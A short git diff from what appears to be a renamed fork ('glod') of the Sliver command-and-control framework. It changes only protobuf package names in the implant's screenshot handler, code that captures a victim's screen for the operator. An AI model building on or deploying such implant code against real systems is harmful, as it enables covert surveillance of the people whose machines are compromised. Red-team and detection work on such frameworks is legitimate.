@@ -26,12 +26,12 @@ import (
 	// {{end}}
 
 	"github.com/starkzarn/glod/implant/sliver/screen"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 	"google.golang.org/protobuf/proto"
 )
 
 func screenshotHandler(data []byte, resp RPCResponse) {
-	sc := &sliverpb.ScreenshotReq{}
+	sc := &glodpb.ScreenshotReq{}
 	err := proto.Unmarshal(data, sc)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -42,7 +42,7 @@ func screenshotHandler(data []byte, resp RPCResponse) {
 	// {{if .Config.Debug}}
 	log.Printf("Screenshot Request")
 	// {{end}}
-	scRes := &sliverpb.Screenshot{}
+	scRes := &glodpb.Screenshot{}
 	scRes.Data = screen.Screenshot()
 	data, err = proto.Marshal(scRes)
 
